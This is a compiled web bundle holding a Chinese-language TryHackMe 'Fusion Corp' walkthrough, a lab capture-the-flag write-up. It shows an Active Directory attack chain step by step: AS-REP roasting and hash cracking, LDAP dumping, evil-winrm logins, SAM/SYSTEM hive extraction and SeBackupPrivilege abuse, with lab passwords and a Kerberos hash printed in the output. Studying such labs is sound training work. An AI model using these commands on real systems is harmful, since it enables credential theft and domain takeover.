"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6365],{75641:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>l,frontMatter:()=>o,metadata:()=>a,toc:()=>d});var t=s(74848),r=s(28453);const o={sidebar_position:181,tags:["Easy","Windows","kerberos","LDAP","PTH"],title:"Fusion Corp",description:"Fusion Corp",sidebar_label:"Fusion Corp",slug:"/tryhackme/181"},i="Fusion Corp",a={id:"box/TryHackMe/181",title:"Fusion Corp",description:"Fusion Corp",source:"@site/docs/box/TryHackMe/181.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/181",permalink:"/docs/tryhackme/181",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"kerberos",permalink:"/docs/tags/kerberos"},{label:"LDAP",permalink:"/docs/tags/ldap"},{label:"PTH",permalink:"/docs/tags/pth"}],version:"current",sidebarPosition:181,frontMatter:{sidebar_position:181,tags:["Easy","Windows","kerberos","LDAP","PTH"],title:"Fusion Corp",description:"Fusion Corp",sidebar_label:"Fusion Corp",slug:"/tryhackme/181"},sidebar:"boxSidebar",previous:{title:"M4tr1x: Exit Denied",permalink:"/docs/tryhackme/180"},next:{title:"Dave's Blog",permalink:"/docs/tryhackme/182"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"kerberos",id:"kerberos",level:2},{value:"SMB",id:"smb",level:2},{value:"ldap",id:"ldap",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"lparker",id:"lparker",level:3},{value:"lparker \u2014&gt;jmurphy",id:"lparker-jmurphy",level:3},{value:"jmurphy \u2014&gt; administrator",id:"jmurphy--administrator",level:3}];function p(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"fusion-corp",children:"Fusion Corp"}),"\n",(0,t.jsx)(n.p,{children:"\u56f0\u96be\u7a0b\u5ea6: \u2b50\u2b50\n\u8003\u5bdf\u77e5\u8bc6\u70b9: Kerberos \u670d\u52a1\u5229\u7528, LDAP, \u7528\u6237\u7279\u6743"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-145-140:~# nmap -sTCV -p- --min-rate 1000 10.10.242.249\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-11-18 04:51 GMT\nNmap scan report for ip-10-10-242-249.eu-west-1.compute.internal (10.10.242.249)\nHost is up (0.0079s latency).\nNot shown: 65513 filtered ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: eBusiness Bootstrap Template\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-18 04:53:13Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain:0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp\n| Not valid before: 2023-11-17T04:08:41\n|_Not valid after:  2024-05-18T04:08:41\n|_ssl-date: 2023-11-18T04:54:00+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49816/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:D4:32:3C:00:5D (Unknown)\nService Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: FUSION-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d4:32:3c:00:5d (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-11-18 04:54:01\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 196.45 seconds\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-238-207:~/fusioncorp# gobuster dir -u http://10.10.43.101/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.43.101/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,html\n[+] Timeout:        10s\n===============================================================\n2023/11/18 14:27:52 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/img (Status: 301)\n/blog.html (Status: 200)\n/css (Status: 301)\n/Index.html (Status: 200)\n/lib (Status: 301)\n/js (Status: 301)\n/Blog.html (Status: 200)\n/backup (Status: 301)\n/contactform (Status: 301)\n===============================================================\n2023/11/18 14:41:45 Finished\n===============================================================\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"/backup"})," \u76ee\u5f55, \u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u7528\u6237\u5217\u8868, \u56e0\u6b64\u53ef\u4ee5\u8fdb\u884c kerberos \u653b\u51fb"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205737.png",alt:"image-20240709205736633"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\t\tName\t   Username\nJhon Mickel\tjmickel\nAndrew Arnold\taarnold\nLellien Linda\tllinda\nJhon Powel\tjpowel\nDominique Vroslav\tdvroslav\nThomas Jeffersonn\ttjefferson\nNola Maurin\tnmaurin\nMira Ladovic\tmladovic\nLarry Parker\tlparker\nKay Garland\tkgarland\nDiana Pertersen\tdpertersen\n"})}),"\n",(0,t.jsx)(n.h2,{id:"kerberos",children:"kerberos"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-238-207:~/fusioncorp# GetNPUsers.py fusion.corp/ -dc-ip 10.10.43.101 -usersfile name.txt \nImpacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra\n\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] invalid principal syntax\n$krb5asrep$23$lparker@FUSION.CORP:d7ebc28f55a2aeb21c71720fd6453f09$86fbbd54ddfb955bfa7a6580ec68386178bffc8bdf6a28c7edc1b8aaa9db8ef5733f025e42ccb6d02169ed20b1af0a7251397849433e08add50134bf7067e7e0bfa1abf1f33056f398e952521e31d6d897d7c2c14d670034d39e1b47f5bb237bba894f421cd914f3cea0b0d3c42a4557a07576dd06cf1305dc5139decccc3b6fa2f4ef5fde899b5be3275c3c3b04bf917fabfb0689c6dc2b0bd0bfadc336540e7e6baa3f1323c2a61e4527c8386e57cf5aa4dd243c3c498c4127296cd63845ce18af8fcadd49cae61e733b9f29a82c7c1ea3d3d74cadd03d0ac524f92d32370294a282a86651f4892d5b\n[-] invalid principal syntax\n\nroot@ip-10-10-238-207:~/fusioncorp# john hash.txt --wordlist=`locate rockyou.txt`\nWarning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"\nUse the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n!!abbylvzsvs2k6! ($krb5asrep$23$lparker@FUSION.CORP)\n1g 0:00:00:06 DONE (2023-11-18 14:45) 0.1524g/s 375024p/s 375024c/s 375024C/s !@#$%%^PRDAluv..\\u0e45\\u0e45/\\u0e04\\u0e45\\u0e45/\\u0e04\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,t.jsx)(n.h2,{id:"smb",children:"SMB"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-238-207:~/fusioncorp# smbmap.py -H 10.10.126.129 -u lparker -p \'!!abbylvzsvs2k6!\'\n\n    ________  ___      ___  _______   ___      ___       __         _______\n   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /\' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __\'  \\    (|  /\n   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   \n                     https://github.com/ShawnDEvans/smbmap\n\n                                                                                                    \n[+] IP: 10.10.126.129:445\tName: fusion.corp         \tStatus: Authenticated\n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tADMIN$                                            \tNO ACCESS\tRemote Admin\n\tC$                                                \tNO ACCESS\tDefault share\n\tIPC$                                              \tREAD ONLY\tRemote IPC\n\tNETLOGON                                          \tREAD ONLY\tLogon server share \n\tSYSVOL                                            \tREAD ONLY\tLogon server share\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u672c\u6765\u60f3\u5728\u8fd9\u91cc dump \u54c8\u5e0c\u7684\u4f46\u662f\u5931\u8d25\u4e86"}),"\n",(0,t.jsx)(n.h2,{id:"ldap",children:"ldap"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5de5\u5177\u6765\u5bf9 ldap \u670d\u52a1\u8fdb\u884c\u4e00\u4e9b\u679a\u4e3e\u6765\u83b7\u53d6\u4e00\u4e9b\u5185\u5bb9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-238-207:~/fusioncorp/ldap# ldapdomaindump 10.10.126.129 -u 'fusion.corp\\lparker' -p '!!abbylvzsvs2k6!'\n[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\nroot@ip-10-10-238-207:~/fusioncorp/ldap# ls\ndomain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html\ndomain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json\ndomain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep\nroot@ip-10-10-238-207:~/fusioncorp/ldap#\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5728\u5176\u4e2d ",(0,t.jsx)(n.code,{children:"domain_users.html"})," \u6587\u4ef6\u4e2d, \u6211\u518d\u6b21\u83b7\u53d6\u5230\u4e00\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u4fe1\u606f"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205801.png",alt:"image-20240709205800686"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"lparker",children:"lparker"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205816.png",alt:"image-20240709205815100"})}),"\n",(0,t.jsx)(n.h3,{id:"lparker-jmurphy",children:"lparker \u2014>jmurphy"}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u7528\u6237  jmurphy \u5b58\u5728 SeBackupPrivilege , \u76f4\u63a5\u5907\u4efd SAM \u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-238-207:~/fusioncorp# evil-winrm -i 10.10.126.129 -u jmurphy  -p 'u8WC3!kLsgw=#bRY'\n\nEvil-WinRM shell v2.4\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> whoami\nfusion\\jmurphy\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Desktop> reg save hklm\\sam .\\sam\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Desktop> reg save hklm\\system .\\system\n"})}),"\n",(0,t.jsx)(n.h3,{id:"jmurphy--administrator",children:"jmurphy \u2014> administrator"}),"\n",(0,t.jsxs)(n.p,{children:["\u5c06\u5bf9\u5e94\u5f97\u6587\u4ef6\u4fdd\u5b58\u4e0b\u6765, \u8fdb\u884c\u5206\u6790\u83b7\u53d6\u5230 administrator \u7528\u6237\u5f97\u54c8\u5e0c \u4f46\u662f\u5f88\u53ef\u60dc\u8fd9\u91cc\u7ba1\u7406\u5458\u7528\u6237\u5e76\u4e0d\u80fd\u8fdb\u884c\u8fdc\u7a0b\u767b\u9646, \u6240\u4ee5\u4f7f\u7528\u4e86\u53e6\u4e00\u79cd\u65b9\u5f0f\u8fdb\u884c\u5229\u7528 ",(0,t.jsx)(n.a,{href:"https://github.com/giuliano108/SeBackupPrivilege",children:"https://github.com/giuliano108/SeBackupPrivilege"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> Import-Module C:\\Users\\jmurphy\\Documents\\SeBackupPrivilegeUtils.dll\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> Import-Module C:\\Users\\jmurphy\\Documents\\SeBackupPrivilegeCmdLets.dll\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\Desktop\\flag.txt C:\\Users\\jmurphy\\Documents\\flag.txt\n*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> ls\n\n    Directory: C:\\Users\\jmurphy\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       11/18/2023   8:19 AM             37 flag.txt\n-a----       11/18/2023   8:18 AM          12288 SeBackupPrivilegeCmdLets.dll\n-a----       11/18/2023   8:18 AM          16384 SeBackupPrivilegeUtils.dll\n-a----       11/18/2023   7:57 AM       18075648 system\n"})})]})}function l(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>a});var t=s(96540);const r={},o=t.createContext(r);function i(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(o.Provider,{value:n},e.children)}}}]);